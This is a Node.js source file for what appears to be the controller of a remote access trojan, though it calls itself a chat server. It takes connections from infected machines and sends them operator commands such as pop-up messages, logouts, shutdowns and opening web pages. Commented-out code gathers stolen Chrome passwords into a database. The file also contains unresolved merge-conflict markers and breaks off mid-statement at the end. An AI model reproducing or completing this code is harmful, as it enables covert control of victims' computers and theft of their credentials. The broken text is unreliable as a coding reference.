var net = require('net');
var readline = require('readline');
var sqlite3 = require('sqlite3');
var db = new sqlite3.Database("userdata.db");
var colors = require('colors');
var CryptoJS = require('crypto-js');

var clients = [];
var names = [];
var chromePasswords = [];

startPromt();
// Start a TCP Server
net.createServer(function (socket) {

  socket.name = socket.remoteAddress + ":" + socket.remotePort;
  clients.push(socket);
  socket.on('data', function (data) {
<<<<<<< HEAD
    console.log(data.toString())
    var arr = data.toString().split("|");
=======
      var arr = data.toString().split("").split("|");
>>>>>>> aac09bb3beea9f2a78d99564311d4a95104b020f
    //Procces data recived using message prefix
    switch(arr[0]) {
      case "user":
        socket.nick = arr[1] +" ("+ socket.remoteAddress + ":" + socket.remotePort+")";
        names.push(socket.nick);
          console.log("New user connected: ".america +socket.nick+"\n");
        break;
      case "yn":
          console.log("\n" + arr[1] + "\n");
        break;
      /*case "pass":
          arrOfPass = arr[1].split("\n");
          chromePasswords.push(arrOfPass);
        arrOfPass.forEach(function (entry) {
        	data = entry.split(">>");
        	savePassToSQLite(data[0], data[1], data[2]);
            });
        break;*/

      default:
          console.log("\n" + arr[1] + "\n");
        break;
    }
    });

    socket.on('end', function () {
   		clients.splice(clients.indexOf(socket), 1);
      if (socket.nick != null) {
        console.log("User disconnected: ".green + socket.nick)
      } else {
        console.log("User disconnected: ".green + socket.name)
      }
  	});
}).listen(80);


//Boss port
net.createServer(function (socket) {
    socket.on('data', function (data) {
      sendCommand(data);
      console.log("Recived cmd from 8000\n".america);
    });
 }).listen(8080);


//Promt for commands
function startPromt() {
  console.log("Chat server running\n".rainbow);
  var rl = readline.createInterface(process.stdin, process.stdout);
  rl.setPrompt('Command -> ');
  rl.prompt();
  rl.on('line', function (line) {
      sendCommand(line);
      rl.prompt();
    }).on('close',function(){process.exit(0);});
}

function sendCommand(command) {
    if (command === "users") names.forEach(function (name) { console.log(name + " "); });
    else if (command == "help") console.log("Usage: [command] [target (* for all)] [argumets (spaces are -)]\nmsg: ok messagebox\nlo: logs out\noff: shutdowns pc\nyn: yes or no message\nweb: opens");
    else if (command == "passlist") console.log(chromePasswords);
    else {
        if (command != "" && command != "\n") {
            clients.forEach(function (client) {
                //Add syntax check
                client.write(command + " \n");
            });
        }
    }
}
/*
function savePassToSQLite(url, username, password) {
    db.serialize(function () {
        var stmt = db.prepare("INSERT INTO ChromeAccounts (URL, Username, Password) VALUES (? ,?, ?)");
        stmt.run(url, username, password);
        stmt.finalize();
    });
}*/

//Encrypt
var ciphertext = CryptoJS.AES.encrypt







